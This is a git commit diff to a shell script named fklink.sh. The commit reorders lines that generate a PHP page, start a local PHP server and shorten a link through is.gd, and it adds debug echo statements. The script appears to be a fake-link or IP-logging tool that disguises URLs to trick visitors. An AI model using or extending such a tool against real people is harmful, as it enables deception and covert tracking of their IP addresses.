c967c913980e098d3d052dc857d96b2941819c9d
Luc-1577 <shoguinha1577@gmail.com>
2024-08-15 01:57:38 -0300

    .

--- fklink.sh
+++ fklink.sh
@@ -109,9 +109,10 @@ if [[ "$msk" != http://* ]] || [[ "$msk" != https://* ]]; then
 fi
 
 cd .server && rm -f ip.php
-make_php "$msk"
-php -S "$host":"$port" > /dev/null 2>&1
 echo "ok"
+make_php "$msk"
+echo "ko"
+php -S "$host":"$port" > /dev/null 2>&1
 ini_cloud
 cd "$loc"
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
